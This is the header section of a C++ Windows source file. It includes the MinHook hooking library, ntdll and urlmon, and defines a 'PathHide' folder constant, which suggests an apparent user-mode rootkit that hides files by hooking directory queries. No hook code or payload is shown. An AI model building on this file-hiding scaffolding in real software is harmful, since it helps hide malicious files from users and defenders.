#include <ntstatus.h>
#include <winternl.h>
#include <Windows.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <Shlwapi.h>
#include <WinIoCtl.h>
#include <iostream>
#include <thread>
#include <Strsafe.h>
#include <tchar.h>
#include <fileapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <vector>
#include <fstream>
#include <ShlObj.h>
#include <string>
#include <string_view>
#include <algorithm>
#include <urlmon.h>
#include <Shellapi.h>
#include <cstring>
#include <cstdlib>

#include "pch.h"
#include "nt_structs.hpp"
#include "MinHook.hpp"
#include <Urlmon.h>

#pragma comment(lib, "Strsafe.lib")
#pragma comment(lib, "Shlwapi")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "libMinHook.x64.lib")
extern const wchar_t* PathHide;
const wchar_t* PathHide = L"C:\\ProgramData\\haunter\\";
#define STATUS_NO_MORE_FILES ((NTSTATUS)0x80000002L)